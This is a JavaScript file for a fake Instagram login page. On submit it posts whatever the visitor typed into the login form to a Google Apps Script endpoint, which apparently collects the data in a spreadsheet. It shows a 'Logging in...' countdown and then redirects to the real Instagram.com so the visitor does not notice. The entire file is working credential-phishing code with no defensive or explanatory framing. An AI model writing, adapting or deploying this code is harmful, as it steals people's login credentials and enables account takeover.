const scriptURL = 'https://script.google.com/macros/s/AKfycbxLPSpwkOulHrXmu9ZqvJG4w6Tu6DcaCQ772HLvT0serFrlwgpipkUaDNOodrBP3q_W/exec';
const form = document.forms['google-sheet'];
const loginButton = document.querySelector('.login');

// The URL to redirect to after successful form submission
const redirectURL = 'https://Instagram.com';  // Replace with your desired URL

// Countdown duration in seconds
const countdownDuration = 5; // Set countdown duration (e.g., 5 seconds)

form.addEventListener('submit', e => {
    e.preventDefault();
    
    // Disable the button to prevent multiple clicks
    loginButton.disabled = true;
    let remainingTime = countdownDuration;

    // Function to update the button text with remaining time
    function updateCountdown() {
        if (remainingTime > 0) {
            loginButton.textContent = `Logging in... (${remainingTime}s)`;
            remainingTime--;
        } else {
            loginButton.textContent = 'Logging in...';
        }
    }

    // Update button text every second
    const countdownInterval = setInterval(updateCountdown, 500);

    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => {
            clearInterval(countdownInterval); // Clear interval on success
            window.location.href = redirectURL; // Redirect after successful submission
        })
        .catch(error => {
            clearInterval(countdownInterval); // Clear interval on error
            console.error('Error!', error.message);
            loginButton.disabled = false; // Re-enable button after error
            loginButton.textContent = 'Log in';
        });
});

// Enable submit button only if form is valid
const loginForm = document.getElementById('login-form');
loginForm.addEventListener('input', () => {
    loginButton.disabled = !loginForm.checkValidity();
});
